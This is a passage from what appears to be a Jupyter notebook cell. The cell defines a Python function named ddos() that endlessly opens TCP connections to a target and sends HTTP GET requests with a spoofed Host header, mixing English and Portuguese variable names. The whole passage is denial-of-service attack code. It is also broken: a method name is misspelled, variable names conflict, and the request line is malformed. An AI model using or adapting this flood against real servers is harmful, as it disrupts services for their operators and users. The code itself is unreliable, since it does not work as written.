    "def ddos():\n",
    "    while True:\n",
    "        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "        s.connect((target,port))\n",
    "        s.sendto((f\"GET/{alvo} HTTP\\1.1\\r\\n\").enconde(\"ascii\"),(alvo,porta))\n",
    "        s.sendto((f\"Host: {ip_falso}\\r\\n\\r\\n\").enconde(\"ascii\"),(alvo,porta))\n",
    "        s.close()"
   ]
  },
